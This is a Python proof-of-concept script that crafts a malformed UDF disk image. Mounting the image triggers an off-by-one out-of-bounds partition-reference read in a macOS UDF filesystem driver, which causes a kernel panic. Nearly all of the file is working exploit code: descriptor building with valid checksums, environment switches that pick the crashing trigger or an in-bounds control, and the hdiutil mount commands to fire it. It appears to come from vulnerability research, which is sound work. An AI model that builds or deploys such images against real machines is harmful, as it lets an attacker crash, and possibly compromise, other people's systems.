#!/usr/bin/env python3
# build_udf_poc.py — craft a minimal UDF image that mounts and triggers
# UDFMount::LogicalToPhysical(partRef=1) OOB read + braa virtual dispatch.
# macOS 27 com.apple.filesystems.udf off-by-one (b.ls @0xb9e5cd0).
# Spec from codex laneT (vrp_udf_partref_offbyone_oob). 2048-byte sectors.
# Trigger live: hdiutil attach -imagekey diskimage-class=CRawDiskImage -nomount? (no -> must mount)
#   hdiutil attach UDF.img   (DiskArbitration auto-mounts UDF) ; then `ls /Volumes/<vol>`.
# Test in a VM (kernel panic on the OOB-read-ptr deref).
import struct, os

SECTOR = 512                      # raw .img presents 512-byte device blocks (UDFMount reads DKIOCGETBLOCKSIZE)
NSECT  = 512                      # 512*512 = 256 KiB (covers LBA 301 + partition @300..400)
img = bytearray(SECTOR * NSECT)

def put(off, data):
    img[off:off+len(data)] = data

# ---- UDF CRC-16/CCITT (ECMA-167), poly 0x1021, init 0, over descriptor body ----
def udf_crc(data):
    crc = 0
    for b in data:
        crc ^= (b << 8)
        for _ in range(8):
            crc = ((crc << 1) ^ 0x1021) & 0xFFFF if (crc & 0x8000) else (crc << 1) & 0xFFFF
    return crc & 0xFFFF

# ---- UDF descriptor tag (16 bytes) ----
# 0:u16 tagID  2:u16 descVersion  4:u8 tagChecksum  5:u8 reserved
# 6:u16 tagSerial  8:u16 descCRC  10:u16 descCRCLength  12:u32 tagLocation
def make_tag(tag_id, tag_loc, crc_len, body):
    t = bytearray(16)
    struct.pack_into('<H', t, 0, tag_id)
    struct.pack_into('<H', t, 2, 3)          # descVersion 3 (NSR03)
    t[5] = 0
    struct.pack_into('<H', t, 6, 1)          # tagSerialNumber
    crc = udf_crc(body[:crc_len]) if crc_len else 0
    struct.pack_into('<H', t, 8, crc)
    struct.pack_into('<H', t, 10, crc_len)
    struct.pack_into('<I', t, 12, tag_loc)
    # tagChecksum = sum of bytes 0..3 and 5..15 mod 256
    cks = (sum(t[0:4]) + sum(t[5:16])) & 0xFF
    t[4] = cks
    return bytes(t)

def write_desc(sector, tag_id, tag_loc, crc_len, body):
    # body is the descriptor bytes from offset 0x10 onward (after the 16-byte tag)
    full = make_tag(tag_id, tag_loc, crc_len, body) + body
    assert len(full) <= SECTOR, f"desc {tag_id} too big {len(full)}"
    put(sector*SECTOR, full)

def entityid(ident=b"+NSR03"):
    e = bytearray(32); e[0]=0; e[1:1+len(ident)] = ident; return bytes(e)

def long_ad(length, lbn, partref):
    # long_ad: u32 length, lb_addr{u32 lbn, u16 partRef}, 6 bytes impl-use
    return struct.pack('<IIH', length, lbn, partref) + b'\x00'*6

# ===== 1. VRS (Volume Recognition Sequence) at sectors 16,17,18 =====
def vsd(idstr):
    v = bytearray(SECTOR); v[0]=0; v[1:6]=idstr; v[6]=1; return bytes(v)
# VRS at ABSOLUTE byte offsets 0x8000/0x8800/0x9000 (UDFMount scans 0x8000 + n*0x800)
put(0x8000, vsd(b"BEA01"))
put(0x8800, vsd(b"NSR03"))
put(0x9000, vsd(b"TEA01"))

# ===== 2. AVDP at sector 256 (tag id=2) =====
# body offsets are relative to tag start; we build body = bytes[0x10:]
avdp_body = bytearray(0x200 - 0x10)
# main VDS extent_ad at AVDP+0x10 -> body[0]: length=4*2048, location=257
struct.pack_into('<II', avdp_body, 0x00, 4*SECTOR, 257)
# reserve extent_ad AVDP+0x18 -> body[8] = 0
write_desc(256, 2, 256, 0x1f0, bytes(avdp_body))

# ===== 3. Main VDS at sectors 257..260 =====
# 257 PrimaryVD (tag id=1)
pvd = bytearray(0x200 - 0x10)
# PVD+0x18 volumeIdentifier (dstring 32) -> body[0x08]
vid = bytearray(32); vid[0:4]=b"UDF\x00"; vid[31]=4
pvd[0x08:0x08+32] = vid
write_desc(257, 1, 257, 0x1f0, bytes(pvd))

# 258 PartitionDescriptor (tag id=5)
pd = bytearray(0x200 - 0x10)
struct.pack_into('<I', pd, 0x10-0x10, 1)     # PD+0x10 volumeDescriptorSequenceNumber=1
struct.pack_into('<H', pd, 0x16-0x10, 0)     # PD+0x16 partitionNumber=0
pd[0x18-0x10:0x18-0x10+32] = entityid(b"+NSR03")  # PD+0x18 partition contents EntityID
struct.pack_into('<I', pd, 0xb8-0x10, 1)     # PD+0xb8 accessType=1
struct.pack_into('<I', pd, 0xbc-0x10, 300)   # PD+0xbc partitionStartingLocation=300
struct.pack_into('<I', pd, 0xc0-0x10, 100)   # PD+0xc0 partitionLength=100
write_desc(258, 5, 258, 0x1f0, bytes(pd))

# 259 LogicalVD (tag id=6)
lvd = bytearray(0x200 - 0x10)
struct.pack_into('<I', lvd, 0xd4-0x10, 512)  # LVD+0xd4 logicalBlockSize = device block (512)
# LVD+0xf8 FSD long_ad: length=2048, lbn=0, partRef=0
lvd[0xf8-0x10:0xf8-0x10+16] = long_ad(2048, 0, 0)
struct.pack_into('<I', lvd, 0x108-0x10, 6)   # LVD+0x108 mapTableLength=6
struct.pack_into('<I', lvd, 0x10c-0x10, 1)   # LVD+0x10c numberOfPartitionMaps=1
# LVD+0x1b8 Type1 partition map: byte0=1,byte1=6,+2 volSeqNum=1,+4 partitionNumber=0
pm = bytearray(6); pm[0]=1; pm[1]=6; struct.pack_into('<H', pm, 2, 1); struct.pack_into('<H', pm, 4, 0)
lvd[0x1b8-0x10:0x1b8-0x10+6] = pm
write_desc(259, 6, 259, 0x1f0, bytes(lvd))

# 260 Terminating Descriptor (tag id=8), crcLen 0
write_desc(260, 8, 260, 0, b'\x00'*(0x200-0x10))

# ===== 4. Partition payload: PD start=300 -> LBN0 = sector 300 =====
# 300 FileSetDescriptor (tag id=0x100)
fsd = bytearray(0x200 - 0x10)
struct.pack_into('<I', fsd, 0x20-0x10, 1)    # FSD+0x20 fileSetNumber=1
# FSD+0x190 rootDirectoryICB long_ad: length=2048, lbn=1, partRef.
# SR_FSDREF=1 => mount-time trigger (root ICB read hits LogicalToPhysical at mount, no ls needed).
fsd[0x190-0x10:0x190-0x10+16] = long_ad(2048, 1, int(os.environ.get("SR_FSDREF", "0")))
write_desc(300, 0x100, 0, 0x1f0, bytes(fsd))   # tagLocation=0 (logical)

# 301 root File Entry (tag id=0x105), partition LBN1 = sector 301
fe = bytearray(0xc0 + 16)        # up to FE+0xb0 long_ad (16 bytes)
struct.pack_into('<I', fe, 0x14-0x10, 4)     # FE+0x14 ICBTag.strategyType=4
fe[0x1b-0x10] = 4                            # FE+0x1b fileType=4 (directory)
struct.pack_into('<H', fe, 0x22-0x10, 1)     # FE+0x22 flags: AD type bits=1 (long_ad)
struct.pack_into('<Q', fe, 0x38-0x10, 2048)  # FE+0x38 informationLength
struct.pack_into('<Q', fe, 0x40-0x10, 1)     # FE+0x40 logicalBlocksRecorded
struct.pack_into('<I', fe, 0xa8-0x10, 0)     # FE+0xa8 L_EA=0
struct.pack_into('<I', fe, 0xac-0x10, 16)    # FE+0xac L_AD=16 (one long_ad)
# FE+0xb0 first long_ad: length=2048 @+0, lbn=0 @+4, partitionReferenceNumber @FE+0xb8
# SR_PARTREF=1 (default) = OOB trigger (==count); SR_PARTREF=0 = in-bounds control (no panic)
_PARTREF = int(os.environ.get("SR_PARTREF", "1"))
fe[0xb0-0x10:0xb0-0x10+16] = long_ad(2048, 0, _PARTREF)
write_desc(301, 0x105, 1, 0xb0, bytes(fe))

OUT = os.path.expanduser(os.environ.get("SR_OUT", "~/udf_poc.img"))
with open(OUT, "wb") as f:
    f.write(img)
print(f"wrote {OUT} ({len(img)} bytes, {NSECT} sectors)")
print("trigger: hdiutil attach ~/udf_poc.img ; ls /Volumes/<vol>  -> UDFMount::LogicalToPhysical(1) OOB read+braa")
print("TEST IN VM (kernel panic). partRef=1 trigger at FE+0xb8 sector 301.")
